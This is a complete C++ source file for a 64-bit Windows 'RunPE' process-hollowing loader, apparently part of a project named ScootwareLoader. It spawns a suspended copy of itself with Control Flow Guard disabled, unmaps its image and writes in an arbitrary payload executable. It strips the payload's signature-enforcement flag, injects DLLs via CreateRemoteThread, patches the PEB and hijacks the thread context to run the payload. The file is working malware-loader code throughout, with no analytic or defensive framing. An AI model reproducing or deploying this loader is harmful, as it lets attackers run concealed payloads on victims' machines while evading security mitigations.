#include "runpe.h"
#include <iostream>
#include <windows.h>
#include <winternl.h>

#pragma comment(lib, "ntdll.lib")

// NTDLL function types
typedef NTSTATUS(NTAPI* fnNtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);
typedef NTSTATUS(NTAPI* fnNtQueryInformationProcess)(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
);

namespace RunPE {

    // Convert an RVA to a raw file offset by walking the section table.
    // Needed because localBuffer holds the raw on-disk PE, not a memory-mapped image.
    static DWORD RvaToOffset(PIMAGE_NT_HEADERS64 pNtHeaders, DWORD rva) {
        PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNtHeaders);
        for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
            DWORD va  = pSec[i].VirtualAddress;
            DWORD vsz = pSec[i].Misc.VirtualSize ? pSec[i].Misc.VirtualSize : pSec[i].SizeOfRawData;
            if (rva >= va && rva < va + vsz)
                return pSec[i].PointerToRawData + (rva - va);
        }
        return 0;
    }

    // Convert PE section characteristics to VirtualProtect constants
    static DWORD SectionProtection(DWORD characteristics) {
        DWORD protect = 0;
        bool exec  = (characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
        bool read  = (characteristics & IMAGE_SCN_MEM_READ) != 0;
        bool write = (characteristics & IMAGE_SCN_MEM_WRITE) != 0;

        if (exec && read && write)       protect = PAGE_EXECUTE_READWRITE;
        else if (exec && read)           protect = PAGE_EXECUTE_READ;
        else if (exec && write)          protect = PAGE_EXECUTE_WRITECOPY;
        else if (exec)                   protect = PAGE_EXECUTE;
        else if (read && write)          protect = PAGE_READWRITE;
        else if (read)                   protect = PAGE_READONLY;
        else if (write)                  protect = PAGE_WRITECOPY;
        else                             protect = PAGE_NOACCESS;

        return protect;
    }

    // Apply base relocations when image loaded at different address than preferred
    static bool ApplyRelocations(
        HANDLE hProcess,
        LPVOID pRemoteImage,
        const uint8_t* localBuffer,
        PIMAGE_NT_HEADERS64 pNtHeaders,
        ULONGLONG delta)
    {
        if (delta == 0) return true; // No relocation needed

        DWORD relocRVA  = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
        DWORD relocSize = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;

        if (relocRVA == 0 || relocSize == 0) {
            std::cout << "[-] PE has no relocation table and cannot be rebased\n";
            return false;
        }

        DWORD relocOffset = RvaToOffset(pNtHeaders, relocRVA);
        if (relocOffset == 0) {
            std::cout << "[-] Failed to map reloc RVA to file offset\n";
            return false;
        }
        const uint8_t* relocBase = localBuffer + relocOffset;
        DWORD processed = 0;

        while (processed < relocSize) {
            auto* block = (IMAGE_BASE_RELOCATION*)(relocBase + processed);
            if (block->SizeOfBlock == 0) break;

            DWORD entryCount = (block->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            WORD* entries = (WORD*)((uint8_t*)block + sizeof(IMAGE_BASE_RELOCATION));

            for (DWORD i = 0; i < entryCount; i++) {
                WORD type   = entries[i] >> 12;
                WORD offset = entries[i] & 0x0FFF;

                if (type == IMAGE_REL_BASED_DIR64) {
                    // Read the original 8-byte value from remote, add delta, write back
                    ULONGLONG patchAddr = (ULONGLONG)pRemoteImage + block->VirtualAddress + offset;
                    ULONGLONG originalValue = 0;

                    if (!ReadProcessMemory(hProcess, (LPCVOID)patchAddr, &originalValue, sizeof(ULONGLONG), NULL)) {
                        std::cout << "[-] Failed to read reloc at RVA 0x" << std::hex << (block->VirtualAddress + offset) << std::dec << "\n";
                        return false;
                    }

                    originalValue += delta;

                    if (!WriteProcessMemory(hProcess, (LPVOID)patchAddr, &originalValue, sizeof(ULONGLONG), NULL)) {
                        std::cout << "[-] Failed to write reloc at RVA 0x" << std::hex << (block->VirtualAddress + offset) << std::dec << "\n";
                        return false;
                    }
                }
                else if (type == IMAGE_REL_BASED_HIGHLOW) {
                    // 32-bit relocation (rare in x64 but handle it)
                    ULONGLONG patchAddr = (ULONGLONG)pRemoteImage + block->VirtualAddress + offset;
                    DWORD originalValue = 0;
                    ReadProcessMemory(hProcess, (LPCVOID)patchAddr, &originalValue, sizeof(DWORD), NULL);
                    originalValue += (DWORD)delta;
                    WriteProcessMemory(hProcess, (LPVOID)patchAddr, &originalValue, sizeof(DWORD), NULL);
                }
                // IMAGE_REL_BASED_ABSOLUTE (type 0) = padding, skip
            }

            processed += block->SizeOfBlock;
        }

        return true;
    }

    // Force a DLL to be loaded into the child process by injecting a LoadLibraryA
    // call via CreateRemoteThread. Safe to call before the main thread resumes
    // because CREATE_SUSPENDED only suspends the initial thread; ntdll/heap are ready.
    static void EnsureDllInChild(HANDLE hProcess, const char* dllName) {
        FARPROC pLoadLibraryA = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
        SIZE_T nameLen = strlen(dllName) + 1;
        LPVOID pRemote = VirtualAllocEx(hProcess, NULL, nameLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!pRemote) return;
        WriteProcessMemory(hProcess, pRemote, dllName, nameLen, NULL);
        HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
            (LPTHREAD_START_ROUTINE)pLoadLibraryA, pRemote, 0, NULL);
        if (hThread) {
            WaitForSingleObject(hThread, 5000);
            CloseHandle(hThread);
        }
        VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
    }

    // Resolve the Import Address Table of the hollowed PE into the child process.
    // System DLLs share the same ASLR base across all processes on the same boot,
    // so addresses resolved in the parent are valid in the child.
    static bool ResolveImports(
        HANDLE hProcess,
        LPVOID pRemoteImage,
        const uint8_t* localBuffer,
        PIMAGE_NT_HEADERS64 pNtHeaders)
    {
        DWORD importRVA  = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
        DWORD importSize = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size;

        if (importRVA == 0 || importSize == 0) {
            std::cout << "[RunPE] No import directory — skipping IAT fixup\n";
            return true;
        }

        DWORD importOffset = RvaToOffset(pNtHeaders, importRVA);
        if (importOffset == 0) {
            std::cout << "[-] Failed to map import RVA to file offset\n";
            return false;
        }
        auto* pImportDesc = (IMAGE_IMPORT_DESCRIPTOR*)(localBuffer + importOffset);

        while (pImportDesc->Name != 0) {
            DWORD nameOffset = RvaToOffset(pNtHeaders, pImportDesc->Name);
            if (nameOffset == 0) {
                std::cout << "[-] IAT: bad DLL name RVA\n";
                return false;
            }
            const char* dllName = (const char*)(localBuffer + nameOffset);

            // Ensure this DLL is mapped in the child before we write its function
            // addresses into the IAT. The child was spawned from ScootwareLoader so
            // it only has ScootwareLoader's imports mapped — payload DLLs like
            // VCRUNTIME140 / api-ms-win-crt-* may be absent.
            EnsureDllInChild(hProcess, dllName);

            HMODULE hDll = LoadLibraryA(dllName);
            if (!hDll) {
                std::cout << "[-] IAT: failed to load " << dllName << "\n";
                return false;
            }

            // Use OriginalFirstThunk (INT) for name lookup, FirstThunk (IAT) for patching
            DWORD intRva = pImportDesc->OriginalFirstThunk ? pImportDesc->OriginalFirstThunk : pImportDesc->FirstThunk;
            DWORD intOffset = RvaToOffset(pNtHeaders, intRva);
            if (intOffset == 0) {
                std::cout << "[-] IAT: bad INT RVA for " << dllName << "\n";
                return false;
            }
            auto* pINT = (IMAGE_THUNK_DATA64*)(localBuffer + intOffset);
            ULONGLONG iatRVA = pImportDesc->FirstThunk;

            for (DWORD i = 0; pINT[i].u1.AddressOfData != 0; i++) {
                FARPROC funcAddr = nullptr;

                if (IMAGE_SNAP_BY_ORDINAL64(pINT[i].u1.Ordinal)) {
                    WORD ordinal = (WORD)(pINT[i].u1.Ordinal & 0xFFFF);
                    funcAddr = GetProcAddress(hDll, MAKEINTRESOURCEA(ordinal));
                    if (!funcAddr) {
                        std::cout << "[-] IAT: failed to resolve ordinal " << ordinal << " from " << dllName << "\n";
                        return false;
                    }
                } else {
                    DWORD ibnOffset = RvaToOffset(pNtHeaders, (DWORD)pINT[i].u1.AddressOfData);
                    if (ibnOffset == 0) {
                        std::cout << "[-] IAT: bad IMAGE_IMPORT_BY_NAME RVA\n";
                        return false;
                    }
                    auto* pIBN = (IMAGE_IMPORT_BY_NAME*)(localBuffer + ibnOffset);
                    funcAddr = GetProcAddress(hDll, pIBN->Name);
                    if (!funcAddr) {
                        std::cout << "[-] IAT: failed to resolve " << pIBN->Name << " from " << dllName << "\n";
                        return false;
                    }
                }

                ULONGLONG patchAddr = (ULONGLONG)pRemoteImage + iatRVA + i * sizeof(ULONGLONG);
                ULONGLONG addrValue = (ULONGLONG)funcAddr;
                if (!WriteProcessMemory(hProcess, (LPVOID)patchAddr, &addrValue, sizeof(ULONGLONG), NULL)) {
                    std::cout << "[-] IAT: WriteProcessMemory failed for IAT entry " << i << " in " << dllName << "\n";
                    return false;
                }
            }

            std::cout << "[RunPE] Resolved imports from: " << dllName << "\n";
            pImportDesc++;
        }

        return true;
    }

    bool Execute(const std::vector<uint8_t>& memoryBuffer, size_t allocationSize) {
        // Validate PE headers
        if (memoryBuffer.size() < sizeof(IMAGE_DOS_HEADER)) {
            std::cout << "[-] Buffer too small for DOS header\n";
            return false;
        }

        PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)memoryBuffer.data();
        if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
            std::cout << "[-] Invalid DOS signature\n";
            return false;
        }

        if ((size_t)pDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS64) > memoryBuffer.size()) {
            std::cout << "[-] Invalid e_lfanew offset\n";
            return false;
        }

        PIMAGE_NT_HEADERS64 pNtHeaders = (PIMAGE_NT_HEADERS64)(memoryBuffer.data() + pDosHeader->e_lfanew);
        if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
            std::cout << "[-] Invalid NT signature\n";
            return false;
        }

        if (pNtHeaders->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) {
            std::cout << "[-] Not a 64-bit PE\n";
            return false;
        }

        // Use self-hollowing: spawn ourselves with --child so ntdll inherits a
        // fully compatible environment (same manifest, activation context, DLL state).
        char hostPath[MAX_PATH];
        GetModuleFileNameA(NULL, hostPath, MAX_PATH);
        std::string commandLine = "\"" + std::string(hostPath) + "\" --child";
        std::cout << "[RunPE] Spawning host: " << hostPath << " --child\n";

        // Create suspended child process with mitigations disabled (CFG causes 0xc0000142 in hollowed processes)
        STARTUPINFOEXA siex = { 0 };
        siex.StartupInfo.cb = sizeof(siex);
        PROCESS_INFORMATION pi = { 0 };

        SIZE_T attrSize = 0;
        InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
        siex.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSize);
        InitializeProcThreadAttributeList(siex.lpAttributeList, 1, 0, &attrSize);

        // Disable CFG and dynamic code restrictions using SDK constants to avoid bit-shift mistakes.
        // CFG causes STATUS_DLL_INIT_FAILED (0xc0000142) in hollowed processes if not disabled.
        DWORD64 policy = 0;
        policy |= PROCESS_CREATION_MITIGATION_POLICY_CONTROL_FLOW_GUARD_ALWAYS_OFF;      // 0x0000000200000000
        policy |= PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_OFF;   // 0x0000002000000000

        UpdateProcThreadAttribute(siex.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(policy), NULL, NULL);

        DWORD createFlags = CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT;
        if (!CreateProcessA(NULL, (LPSTR)commandLine.c_str(), NULL, NULL, FALSE, createFlags, NULL, NULL, &siex.StartupInfo, &pi)) {
            std::cout << "[-] CreateProcess failed (Error: " << GetLastError() << ")\n";
            // Fallback: try without extended attributes
            STARTUPINFOA si = { sizeof(si) };
            if (!CreateProcessA(NULL, (LPSTR)commandLine.c_str(), NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
                std::cout << "[-] Fallback CreateProcess also failed (Error: " << GetLastError() << ")\n";
                DeleteProcThreadAttributeList(siex.lpAttributeList);
                HeapFree(GetProcessHeap(), 0, siex.lpAttributeList);
                return false;
            }
        }

        DeleteProcThreadAttributeList(siex.lpAttributeList);
        HeapFree(GetProcessHeap(), 0, siex.lpAttributeList);

        // Get NtUnmapViewOfSection from ntdll
        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        auto NtUnmapViewOfSection = (fnNtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
        auto NtQueryInformationProcess = (fnNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");

        if (!NtUnmapViewOfSection || !NtQueryInformationProcess) {
            std::cout << "[-] Failed to resolve ntdll functions\n";
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return false;
        }

        // Get PEB address via NtQueryInformationProcess
        PROCESS_BASIC_INFORMATION pbi = { 0 };
        ULONG retLen = 0;
        NTSTATUS status = NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
        if (status != 0) {
            std::cout << "[-] NtQueryInformationProcess failed (0x" << std::hex << status << std::dec << ")\n";
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return false;
        }

        // Read current ImageBaseAddress from PEB
        ULONGLONG originalImageBase = 0;
        // PEB64->ImageBaseAddress is at offset 0x10
        LPVOID pebImageBaseAddr = (LPVOID)((ULONGLONG)pbi.PebBaseAddress + 0x10);
        ReadProcessMemory(pi.hProcess, pebImageBaseAddr, &originalImageBase, sizeof(ULONGLONG), NULL);

        // Unmap the original image from the child process
        NtUnmapViewOfSection(pi.hProcess, (PVOID)originalImageBase);

        ULONGLONG preferredBase = pNtHeaders->OptionalHeader.ImageBase;
        size_t imageSize = pNtHeaders->OptionalHeader.SizeOfImage;
        size_t finalSize = (allocationSize > imageSize) ? allocationSize : imageSize;

        // Ensure we allocate enough memory to hold the trampoline at the host's entry point
        PIMAGE_DOS_HEADER pMyDosHdr = (PIMAGE_DOS_HEADER)GetModuleHandleA(NULL);
        PIMAGE_NT_HEADERS64 pMyNtHdr = (PIMAGE_NT_HEADERS64)((BYTE*)pMyDosHdr + pMyDosHdr->e_lfanew);
        size_t minHostSize = pMyNtHdr->OptionalHeader.AddressOfEntryPoint + 32;
        if (finalSize < minHostSize) {
            finalSize = minHostSize;
        }

        // Try to allocate at preferred ImageBase first
        LPVOID pRemoteImage = VirtualAllocEx(pi.hProcess, (LPVOID)preferredBase, finalSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

        bool needsRelocation = false;
        if (!pRemoteImage) {
            std::cout << "[*] Preferred base 0x" << std::hex << preferredBase << std::dec << " unavailable, rebasing...\n";
            pRemoteImage = VirtualAllocEx(pi.hProcess, NULL, finalSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            needsRelocation = true;
        }

        if (!pRemoteImage) {
            std::cout << "[-] VirtualAllocEx failed (Error: " << GetLastError() << ")\n";
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return false;
        }

        std::cout << "[RunPE] Allocated at 0x" << std::hex << (ULONGLONG)pRemoteImage << std::dec << " (" << finalSize << " bytes)\n";

        // Build a local copy of the headers with flags that cause ntdll to reject
        // unsigned/hollowed images cleared before writing to the child.
        std::vector<uint8_t> headersBuf(memoryBuffer.data(),
                                        memoryBuffer.data() + pNtHeaders->OptionalHeader.SizeOfHeaders);
        auto* pNtHdrPatch = (PIMAGE_NT_HEADERS64)(headersBuf.data() + pDosHeader->e_lfanew);
        // FORCE_INTEGRITY (0x0080): requires image to be signed — our payload is not
        pNtHdrPatch->OptionalHeader.DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_FORCE_INTEGRITY;
        // GUARD_CF (0x4000): CFG flag conflicts with CONTROL_FLOW_GUARD_ALWAYS_OFF process policy
        pNtHdrPatch->OptionalHeader.DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_GUARD_CF;
        // Force WIN32 GUI subsystem to match the host process. The host is always
        // spawned as a GUI process, so if the payload declares CONSOLE subsystem,
        // ntdll will try to attach/allocate a console during early init and fail
        // (STATUS_DLL_INIT_FAILED / 0xC0000142). Forcing GUI here skips that.
        // Payloads that need a console can call AllocConsole() themselves at runtime.
        pNtHdrPatch->OptionalHeader.Subsystem = IMAGE_SUBSYSTEM_WINDOWS_GUI;

        // Ensure the SizeOfImage is large enough to encompass the trampoline
        if (pNtHdrPatch->OptionalHeader.SizeOfImage < finalSize) {
            pNtHdrPatch->OptionalHeader.SizeOfImage = finalSize;
        }

        if (!WriteProcessMemory(pi.hProcess, pRemoteImage, headersBuf.data(), pNtHeaders->OptionalHeader.SizeOfHeaders, NULL)) {
            std::cout << "[-] Failed to write headers\n";
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return false;
        }

        // Write each section
        PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
        for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
            if (pSectionHeader[i].SizeOfRawData == 0) continue; // BSS etc

            LPVOID pDest = (LPVOID)((uintptr_t)pRemoteImage + pSectionHeader[i].VirtualAddress);
            const void* pSrc = memoryBuffer.data() + pSectionHeader[i].PointerToRawData;

            // Bounds check
            if (pSectionHeader[i].PointerToRawData + pSectionHeader[i].SizeOfRawData > memoryBuffer.size()) {
                std::cout << "[-] Section " << pSectionHeader[i].Name << " exceeds buffer\n";
                TerminateProcess(pi.hProcess, 0);
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
                return false;
            }

            if (!WriteProcessMemory(pi.hProcess, pDest, pSrc, pSectionHeader[i].SizeOfRawData, NULL)) {
                std::cout << "[-] Failed to write section: " << pSectionHeader[i].Name << "\n";
                TerminateProcess(pi.hProcess, 0);
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
                return false;
            }
        }

        // Apply relocations if we couldn't get preferred base
        if (needsRelocation) {
            ULONGLONG delta = (ULONGLONG)pRemoteImage - preferredBase;
            std::cout << "[RunPE] Applying relocations (delta: 0x" << std::hex << delta << std::dec << ")\n";

            if (!ApplyRelocations(pi.hProcess, pRemoteImage, memoryBuffer.data(), pNtHeaders, delta)) {
                std::cout << "[-] Relocation failed\n";
                TerminateProcess(pi.hProcess, 0);
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
                return false;
            }
        }

        // Resolve the IAT — must happen after relocations so DLL addresses are final
        if (!ResolveImports(pi.hProcess, pRemoteImage, memoryBuffer.data(), pNtHeaders)) {
            std::cout << "[-] IAT resolution failed\n";
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return false;
        }

        // Update PEB->ImageBaseAddress to point to our new image
        ULONGLONG newBase = (ULONGLONG)pRemoteImage;
        if (!WriteProcessMemory(pi.hProcess, pebImageBaseAddr, &newBase, sizeof(ULONGLONG), NULL)) {
            std::cout << "[-] Failed to patch PEB ImageBaseAddress\n";
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return false;
        }

        // -----------------------------------------------------------------------
        // Redirect entry point via GetThreadContext / SetThreadContext
        // -----------------------------------------------------------------------
        // The thread is suspended; we can directly set Rcx->Rip to the payload
        // entry. This is simpler and more reliable than a trampoline.
        ULONGLONG newEntry = (ULONGLONG)pRemoteImage + pNtHeaders->OptionalHeader.AddressOfEntryPoint;
        {
            CONTEXT ctx = {};
            ctx.ContextFlags = CONTEXT_FULL;
            if (GetThreadContext(pi.hThread, &ctx)) {
                ctx.Rcx = newEntry; // ntdll passes entry point in Rcx before calling it
                ctx.Rip = newEntry;
                if (!SetThreadContext(pi.hThread, &ctx)) {
                    std::cout << "[-] SetThreadContext failed (err=" << GetLastError() << ")\n";
                }
            } else {
                std::cout << "[-] GetThreadContext failed (err=" << GetLastError() << ")\n";
            }
        }

        std::cout << "[RunPE] Successfully mapped. Entry: 0x" << std::hex << newEntry << std::dec << ". Resuming thread...\n";
        ResumeThread(pi.hThread);

        // Wait up to 10s. Windows Error Reporting (WER) keeps the process handle
        // alive while showing the crash dialog, so a short wait gives false positives.
        DWORD waitResult = WaitForSingleObject(pi.hProcess, 10000);
        if (waitResult == WAIT_OBJECT_0) {
            DWORD exitCode = 0;
            GetExitCodeProcess(pi.hProcess, &exitCode);
            std::cout << "[-] Child process died during init (exit: 0x" << std::hex << exitCode << std::dec << ")\n";

            if (exitCode == 0xC0000142)
                std::cout << "[-] STATUS_DLL_INIT_FAILED — a DLL's DllMain returned FALSE or a required DLL failed to load\n";
            else if (exitCode == 0xC0000005)
                std::cout << "[-] STATUS_ACCESS_VIOLATION — relocation or memory protection issue\n";
            else if (exitCode == 0xC0000135)
                std::cout << "[-] STATUS_DLL_NOT_FOUND — target imports a DLL that is not installed\n";

            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return false;
        }

        std::cout << "[RunPE] Child process alive after 10s — injection successful\n";

        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        return true;
    }
}
